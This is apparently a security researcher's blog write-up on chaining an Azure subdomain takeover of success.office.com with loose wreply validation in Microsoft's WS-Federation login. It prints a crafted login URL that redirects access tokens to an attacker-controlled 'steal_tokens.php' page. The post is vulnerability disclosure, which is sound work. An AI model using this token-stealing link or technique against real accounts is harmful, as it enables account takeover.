---
layout: post
title: Leaking access tokens from Microsoft apps chaining two vulnerabilities
---

---




### First Issue:

During the initial recon I retrieved the list of all possible subdomains of office.com pointing to many Azure instances. One of them was success.office.com which was not getting resolved to any IP address, but had a CNAME pointing to an Azure web app instance `successcenter-msprod`. 
Chances are that you can takeover an Azure instance if the domain is not getting resolved to it. So I tried to create a web app with the name `successcenter-msprod` in my Azure portal
and it was accepted as a valid name. In other words, the previous instance with that name had been removed and is now free.
Which basically means, whatever we host on `successcenter-msprod`; `success.office.com` would point to it as the CNAME record specifies. 

### Second Issue:

Microsoft uses WS Federation for it's implementation of a centralized login system for most of the applications including Outlook, Sway, Microsoft Store etc. WS Fed is similar to Oauth. 
`wreply` in WS Fed is the counterpart of `redirect_url` in Oauth. If you read about Nir Goldshlager's <a href="http://nirgoldshlager.blogspot.com/">Facebook Oauth bug series</a>, you will understand
the dangers of not using an exact URL match (or not properly validating) for wreply or redirect_url wherever possible. Here in this case, Microsoft 
was allowing any subdomains of office.com (*.office.com) to be a valid wreply URI. 


Since one of their subdomain was in my control, I could use the domain as a valid `wreply` url and was able to leak the access tokens:

`https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1529775349&rver=6.7.6643.0&wp=MBI_SSL&wreply=https://success.office.com/steal_tokens.php&lc=1033&id=292666&lw=1&fl=easi2&pcexp=true&uictx=me`

Basically, if any user who has already been authenticated (or going to authenticate), "clicked" on a crafted link with the above changes, the tokens would get leaked and this token can be exchanged for a session token and subsequently an account takeover would result.


<img src="http://139.59.39.57/images/outlook.jpg" />

<a href="https://www.safetydetective.com/blog/microsoft-outlook/"></a>

